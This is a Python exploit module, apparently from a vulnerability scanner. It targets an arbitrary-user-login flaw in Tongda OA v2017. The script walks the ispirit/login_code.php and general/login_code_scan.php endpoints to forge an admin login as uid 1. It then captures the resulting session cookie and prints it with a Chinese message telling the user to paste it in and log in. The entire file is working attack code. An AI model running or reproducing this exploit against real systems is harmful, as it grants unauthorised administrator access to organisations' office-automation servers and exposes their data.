import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import json



def 通达OA_v2017_任意用户登录(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=urldata+'ispirit/login_code.php'

    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        resText = json.loads(response.text)
        codeUid = resText['codeuid']
        codeScanUrl = urldata+'general/login_code_scan.php'
        response = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
        resText = json.loads(response.text)
        status = resText['status']
        if status == str(1):
            getCodeUidUrl = urldata+'ispirit/login_code_check.php?codeuid='+codeUid
            response = requests.get(getCodeUidUrl)
            tmp_cookie = response.headers['Set-Cookie']
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(urldata + 'general/index.php',headers=headers)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    print(Vcolors.RED + "[+] 存在通达OA_v2017_任意用户登录漏洞,粘贴cookie尝试登录:{}".format(tmp_cookie) +Vcolors.ENDC)

                else:
                    print(Vcolors.WARNING +"[x] 不存在通达OA_v2017_任意用户登录漏洞" +Vcolors.ENDC)
            else:
                print(Vcolors.WARNING + "[x] 不存在通达OA_v2017_任意用户登录漏洞" +Vcolors.ENDC)
        else:
                print(Vcolors.WARNING + "[x] 不存在通达OA_v2017_任意用户登录漏洞" +Vcolors.ENDC)
    except KeyError as e:
        pass
    except:
        pass
        # logging.error("通达OA_v2017_任意用户登录脚本出现异常")


